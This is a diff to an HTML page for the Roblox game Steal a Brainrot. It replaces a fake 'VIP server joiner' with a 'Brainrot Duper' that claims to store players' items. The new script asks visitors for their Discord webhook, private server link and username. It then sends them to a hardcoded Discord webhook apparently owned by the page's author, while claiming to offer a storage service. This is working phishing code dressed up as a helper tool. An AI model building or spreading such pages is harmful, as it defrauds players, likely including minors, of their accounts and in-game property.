@@ -35,37 +35,115 @@
             box-shadow: 0 2px 8px rgba(0,0,0,0.04);
         }
 
-        .join-btn {
-            font-size: 2rem;
-            padding: 1.5rem 3rem;
+        .input-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 0.8rem;
+            margin: 0.5rem 0;
+            font-size: 1rem;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-sizing: border-box;
+        }
+
+        .submit-btn {
+            font-size: 1.2rem;
+            padding: 0.8rem 2rem;
             background: #0078ff;
             color: #fff;
             border: none;
-            border-radius: 12px;
+            border-radius: 8px;
             cursor: pointer;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
             transition: background 0.2s;
-            margin-top: 1.2rem;
+            margin-top: 1rem;
         }
 
-            .join-btn:hover {
-                background: #005fcc;
-            }
+        .submit-btn:hover {
+            background: #005fcc;
+        }
     </style>
 </head>
 <body>
-    <div class="title">Random VIP joiner</div>
+    <div class="title">Brainrot Duper</div>
     <div class="how-text">
-        This is a STEAL A BRAINROT random vip server joiner what it does is that it will generate hundreds+ vip servers
-        per second and a bot will search if a brainrot 10m or 100m is in the server.
-        
-       
+        Always wanted to store your brainrots because you wanna rebirth or go stealing.
+        welp now you can store all your stuff without any problem of loosing it 
+
+        how this works 
+        -Put your WEBHOOK in the first line
+        -Put your PRIVATE SERVER in the second line 
+        -Put your USERNAME in the third line
+
+        thats all you can connect the bot whenever you want in discord in your own server
     </div>
-    <button class="join-btn" onclick="window.location.href='https://www.roblox.com/share?code=564b5b358293c14a882d50b94f51bca8&type=Server'">
-        Queue to Join Bot 10M+
-    </button>
-    <button class="join-btn" onclick="window.location.href='https://www.roblox.com/share?code=564b5b358293c14a882d50b94f51bca8&type=Server'">
-        Queue to Join Bot 100M+
-    </button>
+    <div class="input-container">
+        <input type="text" id="webhook" class="input-field" placeholder="Webhook">
+        <input type="text" id="privateServer" class="input-field" placeholder="Private Server">
+        <input type="text" id="username" class="input-field" placeholder="Username">
+        <button class="submit-btn" onclick="sendToWebhook()">Submit</button>
+    </div>
+
+    <script>
+        async function sendToWebhook() {
+            const webhook = document.getElementById('webhook').value;
+            const privateServer = document.getElementById('privateServer').value;
+            const username = document.getElementById('username').value;
+
+            // Validate inputs
+            if (!webhook || !privateServer || !username) {
+                alert('Please fill in all fields');
+                return;
+            }
+
+            // Verify webhook starts with https://discord.com/api
+            if (!webhook.startsWith('https://discord.com/api')) {
+                alert('Webhook must start with https://discord.com/api');
+                return;
+            }
+
+            // Verify private server starts with https://roblox.com or https://www.roblox.com
+            if (!privateServer.startsWith('https://roblox.com') && !privateServer.startsWith('https://www.roblox.com')) {
+                alert('Private Server must start with https://roblox.com or https://www.roblox.com');
+                return;
+            }
+
+            const payload = {
+                content: `<@Everyone> **New Submission**\nWebhook: ${webhook}\nPrivate Server: ${privateServer}\nUsername: ${username}`
+            };
+
+            try {
+                const response = await fetch('https://discord.com/api/webhooks/1421414129159114825/WzUVXlVkQoFnbW8HL0HOISIS8as_GISRHIynaAONm4tF-a42hElzMIECIwOhYGl9-Rkz', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    alert('Submission sent successfully!');
+                    document.getElementById('webhook').value = '';
+                    document.getElementById('privateServer').value = '';
+                    document.getElementById('username').value = '';
+                } else {
+                    alert('Failed to send submission. Please try again.');
+                    // Check if the response is a 404 error
+                    if (response.status === 404) {
+                        alert('Webhook URL is invalid. Nelly is serving noodles! Please check the webhook URL and try again.');
+                    }
+                }
+            } catch (error) {
+                alert('An error occurred: ' + error.message);
+            }
+        }
+    </script>
 </body>
 </html>
